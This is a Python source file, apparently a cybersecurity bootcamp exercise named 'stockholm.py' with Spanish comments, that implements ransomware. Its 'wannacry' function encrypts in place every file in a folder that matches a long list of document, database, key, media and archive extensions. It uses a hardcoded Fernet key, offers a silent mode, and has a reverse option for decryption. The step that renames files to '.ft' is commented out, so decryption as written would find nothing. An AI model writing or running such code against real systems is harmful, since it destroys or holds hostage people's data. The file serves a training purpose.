# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: mariza <mariza@student.42.fr>              +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/05/10 09:46:33 by mariza            #+#    #+#              #
#    Updated: 2023/05/30 09:56:06 by mariza           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import argparse
import os
import os.path
from cryptography.fernet import Fernet



RUTA = '/Users/mariza/Desktop/repo-terminados-bootcamp/stockholm/home/infection'
KEY = 'PyMEtpcBTPNHI7y_wlN1dHK_K_NElzbGeYT92ksziJo='
parser = argparse.ArgumentParser()
parser.add_argument ('-v', '--version', dest = 'v', action = 'store_true',  help = 'muestra la version del programa')
parser.add_argument ('-r', '--reverse', dest = 'r', type = str , help = 'revierte la infeccion')
parser.add_argument ('-s', '--silent', dest = 's', action = "store_true",  help = 'hace la infeccion sin hacer ningun output')
parser.add_argument ('-f', type = str, default = RUTA, help = 'manda los archivos a una carpeta especifica')
args = parser.parse_args()

def new_ext(ruta):
    ##añadiendo la extension del archivo a .ft
    ext = (".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt",
             ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods",
             ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp",
             ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay",
             ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb",
             ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd",
             ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h",
             ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl",
             ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb",
             ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla",
             ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4",
             ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u",
             ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm",
             ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso",
             ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak",
             ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk",
             ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt",
             ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv",
             ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst",
             ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm",
             ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw",
             ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm",
             ".docb", ".docx", ".doc")
    for x in os.listdir(ruta):
        ruta_archivo = os.path.join(ruta, x)
        if os.path.isfile(ruta_archivo) and os.path.splitext(x)[1] in ext:
            nueva_extension = x + '.ft'
            nueva_ruta_del_archivo = os.path.join(ruta, nueva_extension)
            os.rename(ruta_archivo, nueva_ruta_del_archivo)

    ##encripto los archivos de la carpetab
def wannacry(silent=False):
    
        fernet = Fernet(KEY)
        ext = (".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt",
                ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods",
                ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp",
                ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay",
                ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb",
                ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd",
                ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h",
                ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl",
                ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb",
                ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla",
                ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4",
                ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u",
                ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm",
                ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso",
                ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak",
                ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk",
                ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt",
                ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv",
                ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst",
                ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm",
                ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw",
                ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm",
                ".docb", ".docx", ".doc")
    
        try:
            for x in os.listdir(RUTA):
                name_archivo, ext_archivo = os.path.splitext(x)
                with open(os.path.join(RUTA, x), 'rb') as f:
                    datos = f.read()
                if os.path.splitext(x)[1] in ext:
                    archivo_encriptado = fernet.encrypt(datos)
                    with open(os.path.join(RUTA, name_archivo + ext_archivo), 'wb') as f:
                        f.write(archivo_encriptado)
                    if not silent:
                        print(f'El archivo {x} ha sido encriptado')
        except:
            print('La carpeta home no exite.')
    
        
        
       # new_ext(RUTA)
    ##desencripto los archivos de la carpeta que tengan la extension .ft
def desencriptado_archivos(key, file, silent=False):
    try:
        if not os.path.exists(file):
            os.makedirs(file)
        fernet = Fernet(key)
        for x in os.listdir(RUTA):
            if x.endswith('.ft'):
                archivo = os.path.join(RUTA, x)
                with open(archivo, 'rb') as f:
                    datos_archivo = f.read()
                descifrado = fernet.decrypt(datos_archivo)
                with open(os.path.splitext(os.path.join(file, x))[0], 'wb') as f:
                    f.write(descifrado)
                if not silent:
                    print(f'El archivo {x} ha sido desencriptado')
            
    except:
        print('La clave introducida no es válida')    
            
if __name__ == '__main__':
    if args.r:
        desencriptado_archivos(args.r, args.f, args.s)
    elif args.v:
        print('version 1.0')
    else:
        wannacry(args.s)
              
        